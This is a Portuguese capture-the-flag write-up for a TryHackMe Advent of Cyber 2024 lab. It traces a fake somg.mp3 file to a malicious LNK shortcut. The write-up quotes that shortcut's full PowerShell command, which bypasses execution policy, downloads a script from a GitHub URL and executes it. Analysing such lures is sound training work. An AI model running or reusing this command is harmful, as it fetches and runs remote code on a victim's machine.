# Advent-of-Cyber-2024-THM
![image](https://github.com/user-attachments/assets/04709f1d-900f-4a3e-9952-d24ccf24caf3)

Tarefa 7

Segurança operaciona

Dia 1: Talvez a música do SOC-mas, ele pensou, não venha de uma loja?

RESOLUÇÃO DAS QUESTÕES:

Executei o Nmap para escanear as portas que estavam abertas, o resultado mostrou 3 portas:
Porta 22 (SSH)
Porta 80 (HTTP)
Porta 8000 (HTTP-alt)



![image](https://github.com/user-attachments/assets/c7d43844-fdc9-454a-b562-953a2924df0f)

Em seguida enumerei os diretórios do webserver com o Gobuster, o que me mostrou o diretório /download estando disponivel



![image](https://github.com/user-attachments/assets/947a076f-b968-4f0e-a30b-a28302a3e680)

Acesse o diretório como http://IP_DA_MAQUINA/download, assim ele já faz download do arquivo zip denominado download.zip.

![image](https://github.com/user-attachments/assets/994d2165-81f4-4ee3-825c-79bc170fdae2)


Descompacte o arquivo zip, e lá conterá dois arquivos .mp3, sendo eles song.mp3 e somg.mp3

Utilizando o comando file song.mp3 eu identifiquei o arquivo como sendo um áudio em formato MPEG ADTS se trata realmente de um arquivo de musica, não tem nada de suspeito nele.
![image](https://github.com/user-attachments/assets/1d3396c9-3635-49b9-bcf2-8a1d47a8f7f8)

Mas temos um arquivo disfarçado sendo o segundo arquivo chamado de somg.mp3, a primeira vista também pode parecer suspeito por ter um erro de ortografia. mas iremos analisar a fundo esse arquivo.
Utilizei o comando file somg.mp3 identifiquei como um atalho LNK ao inves de um arquivo de audio, que apontava para o powershell.exe. iremos nos apronfundar muito mais.
![image](https://github.com/user-attachments/assets/4b9fb32d-e983-4834-9a9b-7282d912d88b)

Usei exiftool somg.mp3, para obter informações mais detalhadas sobre o atalho, e o arquivo apontava para um comando PowerShell, que baixava e executava um script localizado no GitHub, sendo o comando:
powershell.exe -ep bypass -nop -c (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1')

![image](https://github.com/user-attachments/assets/fdf7380b-cde3-42af-8c72-8a3699b23b60)



RESPONDENDO A 1ª PERGUNTA
![image](https://github.com/user-attachments/assets/45ce33f5-bab7-4c73-b64f-6bede4101ee0)
Eu também usei o exiftool no arquivo song.mp3, confirmando que ele era realmente um arquivo MP3 e obtendo a informação da 1ª pergunta da TAREFA 7, sendo o Artista: Tyler Ramsbey

